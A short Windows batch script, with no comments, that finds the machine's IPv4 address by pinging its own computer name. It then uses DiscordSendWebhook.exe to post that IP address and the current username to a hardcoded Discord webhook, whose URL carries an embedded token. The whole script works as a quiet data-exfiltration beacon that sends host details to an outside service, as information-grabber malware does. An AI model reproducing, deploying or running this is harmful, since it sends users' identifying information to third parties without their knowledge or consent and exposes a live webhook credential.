for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
echo Network IP: %NetworkIP%

@echo off
DiscordSendWebhook.exe -m %NetworkIP% -n "info" -a http://www.phoenix125.com/share/phoenix.png -w https://discord.com/api/webhooks/1189341522471166043/T4wnczQWUpXLelcnPEcMkD76LkuAEgfug66ewBYL7FAOZouJppaaK-45invA4d12N9Pe

@echo off
DiscordSendWebhook.exe -m %USERNAME% -n "info" -a http://www.phoenix125.com/share/phoenix.png -w https://discord.com/api/webhooks/1189341522471166043/T4wnczQWUpXLelcnPEcMkD76LkuAEgfug66ewBYL7FAOZouJppaaK-45invA4d12N9Pe
